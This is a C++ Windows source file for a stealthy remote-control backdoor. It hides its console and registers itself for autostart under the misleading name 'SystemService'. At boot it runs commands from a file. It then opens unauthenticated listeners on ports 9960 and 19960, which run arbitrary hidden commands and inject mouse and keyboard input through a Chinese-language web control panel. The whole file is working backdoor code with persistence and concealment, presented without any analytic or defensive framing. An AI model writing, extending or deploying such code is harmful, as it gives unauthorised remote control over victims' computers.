#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <string>
#include <sstream>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#define PORT 9960
#define HTTP_PORT 19960
#define BUFFER_SIZE 81920
#define MAX_LINE 10240
class InputController {
public:
static void MouseMove(int x,int y){SetCursorPos(x,y);}
static void MouseClick(int button){DWORD dwFlags=MOUSEEVENTF_ABSOLUTE;switch(button){case 0:dwFlags|=MOUSEEVENTF_LEFTDOWN;break;case 1:dwFlags|=MOUSEEVENTF_RIGHTDOWN;break;case 2:dwFlags|=MOUSEEVENTF_MIDDLEDOWN;break;}mouse_event(dwFlags,0,0,0,0);Sleep(50);dwFlags=MOUSEEVENTF_ABSOLUTE;switch(button){case 0:dwFlags|=MOUSEEVENTF_LEFTUP;break;case 1:dwFlags|=MOUSEEVENTF_RIGHTUP;break;case 2:dwFlags|=MOUSEEVENTF_MIDDLEUP;break;}mouse_event(dwFlags,0,0,0,0);}
static void MouseScroll(int delta){mouse_event(MOUSEEVENTF_WHEEL,0,0,delta,0);}
static void KeyboardInput(WORD vkCode,BOOL bCtrl=FALSE,BOOL bShift=FALSE,BOOL bAlt=FALSE){if(bCtrl)keybd_event(VK_CONTROL,0,0,0);if(bShift)keybd_event(VK_SHIFT,0,0,0);if(bAlt)keybd_event(VK_MENU,0,0,0);keybd_event(vkCode,0,0,0);Sleep(50);keybd_event(vkCode,0,KEYEVENTF_KEYUP,0);if(bCtrl)keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP,0);if(bShift)keybd_event(VK_SHIFT,0,KEYEVENTF_KEYUP,0);if(bAlt)keybd_event(VK_MENU,0,KEYEVENTF_KEYUP,0);}
static void TypeText(const std::string& text){for(char c:text){if(c>='a'&&c<='z'){keybd_event(c,0,0,0);keybd_event(c,0,KEYEVENTF_KEYUP,0);}else if(c>='A'&&c<='Z'){keybd_event(VK_SHIFT,0,0,0);keybd_event(c,0,0,0);keybd_event(c,0,KEYEVENTF_KEYUP,0);keybd_event(VK_SHIFT,0,KEYEVENTF_KEYUP,0);}Sleep(10);}}
};
void AddToStartup(){HKEY hKey;char szPath[MAX_PATH];char szKey[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";char szAppName[]="SystemService";GetModuleFileNameA(NULL,szPath,MAX_PATH);if(RegOpenKeyExA(HKEY_CURRENT_USER,szKey,0,KEY_SET_VALUE,&hKey)==ERROR_SUCCESS){RegSetValueExA(hKey,szAppName,0,REG_SZ,(BYTE*)szPath,strlen(szPath)+1);RegCloseKey(hKey);}}
BOOL RunHiddenProcess(const std::string& cmdLine){STARTUPINFOA si={0};PROCESS_INFORMATION pi={0};si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;si.dwFlags|=STARTF_FORCEOFFFEEDBACK;if(!CreateProcessA(NULL,(LPSTR)cmdLine.c_str(),NULL,NULL,FALSE,CREATE_NO_WINDOW|DETACHED_PROCESS|CREATE_NEW_PROCESS_GROUP,NULL,NULL,&si,&pi)){return FALSE;}WaitForInputIdle(pi.hProcess,1000);SuspendThread(pi.hThread);ResumeThread(pi.hThread);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);return TRUE;}
void ExecuteBootCommands(){HANDLE hFile=CreateFileA("bt.txt",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);if(hFile==INVALID_HANDLE_VALUE)return;DWORD fileSize=GetFileSize(hFile,NULL);if(fileSize==0||fileSize>1024*1024*2){CloseHandle(hFile);return;}char* buffer=(char*)malloc(fileSize+1);if(!buffer){CloseHandle(hFile);return;}DWORD bytesRead;if(!ReadFile(hFile,buffer,fileSize,&bytesRead,NULL)){free(buffer);CloseHandle(hFile);return;}buffer[bytesRead]='\0';CloseHandle(hFile);char* line=strtok(buffer,"\r\n");while(line!=NULL){if(strlen(line)>0){BOOL hasContent=FALSE;for(char* p=line;*p;p++){if(*p!=' '&&*p!='\t'){hasContent=TRUE;break;}}if(hasContent){RunHiddenProcess(std::string(line));Sleep(100);}}line=strtok(NULL,"\r\n");}free(buffer);}
BOOL InitializeWinsock(){WSADATA wsaData;return WSAStartup(MAKEWORD(2,2),&wsaData)==0;}
std::string ParseHTTPRequest(const char* request,std::string& path,std::string& query){std::string req(request);size_t pos=req.find('\n');if(pos==std::string::npos)return"";std::string firstLine=req.substr(0,pos);pos=firstLine.find(' ');if(pos==std::string::npos)return"";size_t pos2=firstLine.find(' ',pos+1);if(pos2==std::string::npos)return"";path=firstLine.substr(pos+1,pos2-pos-1);size_t qpos=path.find('?');if(qpos!=std::string::npos){query=path.substr(qpos+1);path=path.substr(0,qpos);}return firstLine.substr(0,pos);}
std::string HandleHTTPRequest(const std::string& path,const std::string& query){std::string response;std::string html;if(path=="/"||path=="/index.html"){html=R"(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>远程控制面板</title>
<style>
body { font-family: Arial; margin: 20px; background: #1a1a2e; color: #fff; }
.container { max-width: 800px; margin: 0 auto; }
.btn { background: #16213e; border: 1px solid #0f3460; color: #fff; padding: 10px 20px; margin: 5px; cursor: pointer; border-radius: 5px; }
.btn:hover { background: #0f3460; }
.control-group { background: #16213e; padding: 20px; margin: 10px 0; border-radius: 10px; }
.btn-group { display: flex; flex-wrap: wrap; gap: 5px; }
input, textarea { background: #0a0a1a; border: 1px solid #0f3460; color: #fff; padding: 8px; margin: 5px; border-radius: 5px; }
.status { color: #4ecca3; margin-top: 10px; }
.title { color: #4ecca3; border-bottom: 2px solid #0f3460; padding-bottom: 10px; }
.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
.full { grid-column: 1/3; }
</style>
</head>
<body>
<div class="container">
<h1 class="title">🖥️ 远程控制系统</h1>
<div class="control-group">
<h3>🖱️ 鼠标控制</h3>
<div class="grid">
<div>
<label>X: <input type="number" id="mx" value="500"></label>
<label>Y: <input type="number" id="my" value="500"></label>
<button class="btn" onclick="sendCmd('mouse_move?x='+document.getElementById('mx').value+'&y='+document.getElementById('my').value)">移动</button>
</div>
<div>
<button class="btn" onclick="sendCmd('mouse_click?btn=0')">左键</button>
<button class="btn" onclick="sendCmd('mouse_click?btn=1')">右键</button>
<button class="btn" onclick="sendCmd('mouse_click?btn=2')">中键</button>
<button class="btn" onclick="sendCmd('mouse_scroll?delta=120')">上滚</button>
<button class="btn" onclick="sendCmd('mouse_scroll?delta=-120')">下滚</button>
</div>
</div>
</div>
<div class="control-group">
<h3>⌨️ 键盘控制</h3>
<div class="grid">
<div>
<label>按键码: <input type="number" id="keycode" value="65" placeholder="虚拟键码"></label>
<button class="btn" onclick="sendCmd('key_press?code='+document.getElementById('keycode').value)">按下</button>
</div>
<div>
<button class="btn" onclick="sendCmd('key_press?code=13')">Enter</button>
<button class="btn" onclick="sendCmd('key_press?code=32')">Space</button>
<button class="btn" onclick="sendCmd('key_press?code=8')">Backspace</button>
<button class="btn" onclick="sendCmd('key_press?code=9')">Tab</button>
</div>
<div class="full">
<label>文本输入: <input type="text" id="textinput" placeholder="输入文本"></label>
<button class="btn" onclick="sendCmd('type_text?text='+encodeURIComponent(document.getElementById('textinput').value))">发送</button>
</div>
</div>
</div>
<div class="control-group">
<h3>⚡ 快捷命令</h3>
<div class="btn-group">
<button class="btn" onclick="sendCmd('key_press?code=67&ctrl=1')">Ctrl+C</button>
<button class="btn" onclick="sendCmd('key_press?code=86&ctrl=1')">Ctrl+V</button>
<button class="btn" onclick="sendCmd('key_press?code=65&ctrl=1')">Ctrl+A</button>
<button class="btn" onclick="sendCmd('key_press?code=88&ctrl=1')">Ctrl+X</button>
<button class="btn" onclick="sendCmd('key_press?code=76&ctrl=1')">Ctrl+L</button>
</div>
</div>
<div class="control-group">
<h3>💻 系统命令</h3>
<div class="btn-group">
<button class="btn" onclick="sendCmd('system_cmd?cmd=calc')">计算器</button>
<button class="btn" onclick="sendCmd('system_cmd?cmd=notepad')">记事本</button>
<button class="btn" onclick="sendCmd('system_cmd?cmd=cmd')">命令提示符</button>
<button class="btn" onclick="sendCmd('system_cmd?cmd=explorer')">资源管理器</button>
</div>
</div>
<div id="status" class="status">就绪</div>
</div>
<script>
function sendCmd(cmd) {
fetch('/' + cmd)
.then(response => response.text())
.then(data => {
document.getElementById('status').textContent = '✓ ' + data;
})
.catch(err => {
document.getElementById('status').textContent = '✗ 错误: ' + err;
});
}
</script>
</body>
</html>
)";response="HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: "+std::to_string(html.length())+"\r\n\r\n"+html;}else if(path=="/mouse_move"){int x=0,y=0;sscanf(query.c_str(),"x=%d&y=%d",&x,&y);InputController::MouseMove(x,y);response="HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nMouse moved to "+std::to_string(x)+","+std::to_string(y);}else if(path=="/mouse_click"){int btn=0;sscanf(query.c_str(),"btn=%d",&btn);InputController::MouseClick(btn);response="HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nMouse clicked button "+std::to_string(btn);}else if(path=="/mouse_scroll"){int delta=0;sscanf(query.c_str(),"delta=%d",&delta);InputController::MouseScroll(delta);response="HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nScrolled "+std::to_string(delta);}else if(path=="/key_press"){int code=0,ctrl=0,shift=0,alt=0;sscanf(query.c_str(),"code=%d&ctrl=%d&shift=%d&alt=%d",&code,&ctrl,&shift,&alt);InputController::KeyboardInput((WORD)code,ctrl!=0,shift!=0,alt!=0);response="HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nKey pressed "+std::to_string(code);}else if(path=="/type_text"){std::string text;size_t pos=query.find("text=");if(pos!=std::string::npos){text=query.substr(pos+5);for(char& c:text)if(c=='+')c=' ';std::string decoded;for(size_t i=0;i<text.length();i++){if(text[i]=='%'&&i+2<text.length()){char hex[3]={text[i+1],text[i+2],0};decoded+=(char)strtol(hex,NULL,16);i+=2;}else{decoded+=text[i];}}InputController::TypeText(decoded);}response="HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nText typed";}else if(path=="/system_cmd"){std::string cmd;size_t pos=query.find("cmd=");if(pos!=std::string::npos){cmd=query.substr(pos+4);std::string decoded;for(size_t i=0;i<cmd.length();i++){if(cmd[i]=='%'&&i+2<cmd.length()){char hex[3]={cmd[i+1],cmd[i+2],0};decoded+=(char)strtol(hex,NULL,16);i+=2;}else{decoded+=cmd[i];}}RunHiddenProcess(decoded);}response="HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nCommand executed";}else{response="HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nNot Found";}return response;}
void HandleHTTPClient(SOCKET clientSocket){char buffer[BUFFER_SIZE];int bytesReceived=recv(clientSocket,buffer,BUFFER_SIZE-1,0);if(bytesReceived<=0){closesocket(clientSocket);return;}buffer[bytesReceived]='\0';std::string path,query;std::string method=ParseHTTPRequest(buffer,path,query);if(method=="GET"){std::string response=HandleHTTPRequest(path,query);send(clientSocket,response.c_str(),response.length(),0);}else{const char* response="HTTP/1.1 405 Method Not Allowed\r\n\r\n";send(clientSocket,response,strlen(response),0);}closesocket(clientSocket);}
SOCKET CreateHTTPServer(){SOCKET serverSocket=socket(AF_INET,SOCK_STREAM,0);if(serverSocket==INVALID_SOCKET)return INVALID_SOCKET;int reuse=1;setsockopt(serverSocket,SOL_SOCKET,SO_REUSEADDR,(char*)&reuse,sizeof(reuse));sockaddr_in serverAddr;serverAddr.sin_family=AF_INET;serverAddr.sin_addr.s_addr=INADDR_ANY;serverAddr.sin_port=htons(HTTP_PORT);if(bind(serverSocket,(sockaddr*)&serverAddr,sizeof(serverAddr))==SOCKET_ERROR){closesocket(serverSocket);return INVALID_SOCKET;}if(listen(serverSocket,10)==SOCKET_ERROR){closesocket(serverSocket);return INVALID_SOCKET;}return serverSocket;}
SOCKET CreateServer(){SOCKET serverSocket=socket(AF_INET,SOCK_STREAM,0);if(serverSocket==INVALID_SOCKET)return INVALID_SOCKET;int reuse=1;setsockopt(serverSocket,SOL_SOCKET,SO_REUSEADDR,(char*)&reuse,sizeof(reuse));int timeout=30000;setsockopt(serverSocket,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));setsockopt(serverSocket,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout));sockaddr_in serverAddr;serverAddr.sin_family=AF_INET;serverAddr.sin_addr.s_addr=INADDR_ANY;serverAddr.sin_port=htons(PORT);if(bind(serverSocket,(sockaddr*)&serverAddr,sizeof(serverAddr))==SOCKET_ERROR){closesocket(serverSocket);return INVALID_SOCKET;}if(listen(serverSocket,5)==SOCKET_ERROR){closesocket(serverSocket);return INVALID_SOCKET;}return serverSocket;}
void HandleTCPClient(SOCKET clientSocket){char buffer[BUFFER_SIZE];int bytesReceived;send(clientSocket,"Service Ready\n",14,0);while((bytesReceived=recv(clientSocket,buffer,BUFFER_SIZE-1,0))>0){buffer[bytesReceived]='\0';if(bytesReceived>3&&strncmp(buffer,"cb:",3)==0){std::string cmd=buffer+3;while(!cmd.empty()&&(cmd.back()=='\n'||cmd.back()=='\r')){cmd.pop_back();}if(!cmd.empty()){if(RunHiddenProcess(cmd)){send(clientSocket,"OK\n",3,0);}else{send(clientSocket,"ERROR: Execute failed\n",23,0);}}else{send(clientSocket,"ERROR: Empty command\n",22,0);}}else{send(clientSocket,"ERROR: Use 'cb:command'\n",25,0);}}closesocket(clientSocket);}
void RunServers(){SOCKET tcpServer=CreateServer();SOCKET httpServer=CreateHTTPServer();fd_set readSet;TIMEVAL timeout;timeout.tv_sec=1;timeout.tv_usec=0;while(TRUE){FD_ZERO(&readSet);if(tcpServer!=INVALID_SOCKET)FD_SET(tcpServer,&readSet);if(httpServer!=INVALID_SOCKET)FD_SET(httpServer,&readSet);int selectResult=select(0,&readSet,NULL,NULL,&timeout);if(selectResult>0){if(tcpServer!=INVALID_SOCKET&&FD_ISSET(tcpServer,&readSet)){sockaddr_in clientAddr;int addrLen=sizeof(clientAddr);SOCKET clientSocket=accept(tcpServer,(sockaddr*)&clientAddr,&addrLen);if(clientSocket!=INVALID_SOCKET){HandleTCPClient(clientSocket);}}if(httpServer!=INVALID_SOCKET&&FD_ISSET(httpServer,&readSet)){sockaddr_in clientAddr;int addrLen=sizeof(clientAddr);SOCKET clientSocket=accept(httpServer,(sockaddr*)&clientAddr,&addrLen);if(clientSocket!=INVALID_SOCKET){HandleHTTPClient(clientSocket);}}}}if(tcpServer!=INVALID_SOCKET)closesocket(tcpServer);if(httpServer!=INVALID_SOCKET)closesocket(httpServer);}
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow){AllocConsole();HWND hWnd=GetConsoleWindow();if(hWnd){ShowWindow(hWnd,SW_HIDE);FreeConsole();}SetPriorityClass(GetCurrentProcess(),BELOW_NORMAL_PRIORITY_CLASS);AddToStartup();if(!InitializeWinsock()){return 1;}ExecuteBootCommands();RunServers();WSACleanup();return 0;}
int main(){return WinMain(GetModuleHandle(NULL),NULL,NULL,SW_HIDE);}